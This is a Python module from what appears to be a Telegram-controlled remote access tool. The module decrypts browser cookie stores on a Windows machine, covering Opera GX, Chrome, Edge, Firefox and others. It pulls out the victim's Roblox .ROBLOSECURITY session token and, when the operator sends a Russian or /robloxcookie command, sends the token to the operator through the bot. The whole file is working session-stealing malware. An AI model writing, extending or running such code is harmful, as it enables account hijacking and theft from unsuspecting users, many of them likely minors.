##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/

# forked from https://github.com/cybermads/Letrium.git
# author: cyberman



import os
import platform
import sqlite3
import win32crypt 

from aiogram import types, F
from aiogram.filters import Command
from config import ALLOWED_USER_ID
import browser_cookie3

PATHS = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]

# Opera GX
def get_opera_gx_cookie_path():
    if platform.system() == "Windows":
        path = os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")
        cookie_path = os.path.join(path, "Cookies")
        return cookie_path if os.path.exists(cookie_path) else None
    return None

# Opera GX 
def get_roblosecurity_from_opera_gx():
    cookie_path = get_opera_gx_cookie_path()
    if not cookie_path:
        return None

    try:
        conn = sqlite3.connect(cookie_path)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT encrypted_value FROM cookies
            WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'
        """)
        result = cursor.fetchone()
        conn.close()

        if result:
            encrypted_value = result[0]
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted_value.decode()
    except Exception as e:
        print(f"[!] Opera GX Cookie Error: {e}")
        return None

    return None


def register_roblosecurity_handler(dp):
    @dp.message(F.text.lower() == "роблокс куки")
    @dp.message(Command("robloxcookie"))
    async def roblosecurity(message: types.Message):
        if message.from_user.id != ALLOWED_USER_ID:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")
            return

        # Opera GX
        roblosecurity_cookie = get_roblosecurity_from_opera_gx()
        if roblosecurity_cookie:
            await message.answer(f"ROBLOSECURITY (Opera GX):\n`{roblosecurity_cookie}`", parse_mode="Markdown")
            return

        for local in PATHS:
            try:
                cookies = getattr(browser_cookie3, local)(domain_name="roblox.com")

                for cookie in cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        await message.answer(f"ROBLOSECURITY ({local}):\n`{cookie.value}`", parse_mode="Markdown")
                        return
            except Exception:
                continue

        await message.answer("Не удалось найти ROBLOSECURITY куки.")


            
        